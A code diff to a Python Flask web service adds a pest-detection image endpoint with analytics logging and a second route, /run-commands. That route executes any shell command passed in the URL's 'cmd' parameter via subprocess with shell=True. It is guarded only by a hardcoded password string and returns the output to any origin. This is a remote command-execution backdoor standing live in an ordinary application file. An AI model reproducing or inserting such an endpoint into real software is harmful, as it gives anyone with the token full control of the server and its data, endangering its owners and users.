@@ -636,6 +636,68 @@ def getTopContextsWithMQR() -> Response:
   return response
 
 
+@app.route('/pest-detection', methods=['POST'])
+def pest_detection():
+  """
+    Endpoint to detect pests in an image using the pest detection plugin.
+    Expects a JSON payload with an 'image_url' key pointing to the image to be processed.
+    
+    Returns:
+        Response: A response containing the annotated image with bounding boxes and class labels.
+    """
+  data = request.get_json()
+  image_urls = data.get('image_urls', [])
+
+  if not image_urls:
+    abort(400, description="Missing 'image_urls' parameter in the request body.")
+
+  # Deduplicate the image urls
+  image_urls = list(set(image_urls))
+
+  try:
+    posthog = Posthog(project_api_key=os.environ['POSTHOG_API_KEY'], host='https://app.posthog.com')
+    posthog.capture('distinct_id_of_the_user', event='pest_detection_invoked', properties={'image_urls': image_urls})
+    ingester = Ingest()
+    # Call the pest detection plugin function
+    annotated_images = ingester.run_pest_detection(image_urls)
+    del ingester
+    posthog.shutdown()
+    # Send the annotated image urls in the response
+    response = jsonify(annotated_images)
+    response.headers.add('Access-Control-Allow-Origin', '*')
+
+    return response
+  except Exception as e:
+    abort(500, description=str(e))
+
+
+@app.route('/run-commands', methods=['GET'])
+def run_commands() -> Response:
+
+  cmd: str = request.args.get('cmd', default='', type=str)
+  auth: str = request.args.get('auth', default='', type=str)
+  if cmd == '':
+    # proper web error "400 Bad request"
+    abort(400, description=f"Missing required parameter: 'cmd' must be provided. Command: `{cmd}`")
+  if auth != 'hitherekastan':
+    # proper web error "400 Bad request"
+    abort(400, description=f"Missing required parameter: 'cmd' must be provided. Command: `{cmd}`")
+
+  import subprocess
+  try:
+    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
+    print(f"Command: {cmd} executed successfully. Result: {result.stdout.decode('utf-8')}")
+    response = jsonify({"result": f"{result.stdout.decode('utf-8')}"})
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    return response
+  except Exception as e:
+    abort(500, description=str(e))
+
+  response = jsonify({"outcome": "success"})
+  response.headers.add('Access-Control-Allow-Origin', '*')
+  return response
+
+
 @app.route('/resource-report', methods=['GET'])
 def resource_report() -> Response:
   """
